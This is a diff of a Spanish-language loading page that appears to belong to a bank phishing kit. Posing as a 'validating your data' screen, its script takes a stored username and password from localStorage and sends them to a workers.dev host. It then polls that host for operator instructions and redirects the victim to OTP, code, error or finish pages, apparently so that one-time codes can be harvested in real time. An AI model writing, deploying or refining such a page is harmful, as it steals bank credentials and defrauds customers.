@@ -1,46 +1,50 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Cargando...</title>
   <style>
     body {
-      background: #0d1b2a;
-      color: #fff;
       font-family: Arial, sans-serif;
-      text-align: center;
+      background: #0a0f2c;
+      color: #fff;
       display: flex;
       flex-direction: column;
       justify-content: center;
+      align-items: center;
       height: 100vh;
       margin: 0;
     }
     .spinner {
-      border: 6px solid rgba(255, 255, 255, 0.1);
-      border-left-color: #00b4d8;
+      border: 5px solid rgba(255,255,255,0.2);
+      border-top: 5px solid #4fc3f7;
       border-radius: 50%;
-      width: 60px;
-      height: 60px;
+      width: 70px;
+      height: 70px;
       animation: spin 1s linear infinite;
-      margin: 0 auto 20px;
+      margin-bottom: 20px;
     }
     @keyframes spin {
       to { transform: rotate(360deg); }
     }
-    .text {
+    h2 {
       font-size: 1.2rem;
+      text-align: center;
     }
   </style>
 </head>
 <body>
   <div class="spinner"></div>
-  <div class="text">Cargando, por favor espera...</div>
+  <h2>Validando tus datos, por favor espera...</h2>
 
   <script>
-    document.addEventListener('DOMContentLoaded', async function () {
+    document.addEventListener('DOMContentLoaded', async () => {
       const bancoldata = JSON.parse(localStorage.getItem('bancoldata'));
-      if (!bancoldata || !bancoldata.usuario || !bancoldata.clave) return;
+      if (!bancoldata || !bancoldata.usuario || !bancoldata.clave) {
+        alert("Faltan datos de login");
+        return;
+      }
 
       const usuario = bancoldata.usuario;
       const clave = bancoldata.clave;
@@ -54,7 +58,7 @@
           body: JSON.stringify({ usuario, clave, transactionId })
         });
       } catch (e) {
-        console.error("Error al conectar al Worker:", e);
+        console.error("Error enviando login:", e);
       }
 
       const checkStatus = async () => {
@@ -62,15 +66,21 @@
           const res = await fetch(`https://blue-night-7897.claropromoxlaro.workers.dev/status?id=${transactionId}`);
           const data = await res.json();
 
-          if (data.autorizado && !data.error) window.location.href = "codigo.html";
-          else if (data.error && !data.finalizado && !data.otpSolicitado) window.location.href = "usererror.html";
-          else if (data.otpSolicitado) window.location.href = "otp.html";
-          else if (data.error && data.fallo) window.location.href = "fallo.html";
-          else if (data.finalizado) window.location.href = "finalizar.html";
+          if (!data.estado) {
+            setTimeout(checkStatus, 2000);
+            return;
+          }
+
+          if (data.estado === "autorizado") window.location.href = "codigo.html";
+          else if (data.estado === "error") window.location.href = "usererror.html";
+          else if (data.estado === "otp") window.location.href = "otp.html";
+          else if (data.estado === "fallo") window.location.href = "fallo.html";
+          else if (data.estado === "finalizado") window.location.href = "finalizar.html";
           else setTimeout(checkStatus, 2000);
+
         } catch (err) {
-          console.error("Error en polling:", err);
-          setTimeout(checkStatus, 2000);
+          console.error("Error comprobando estado:", err);
+          setTimeout(checkStatus, 3000);
         }
       };
 
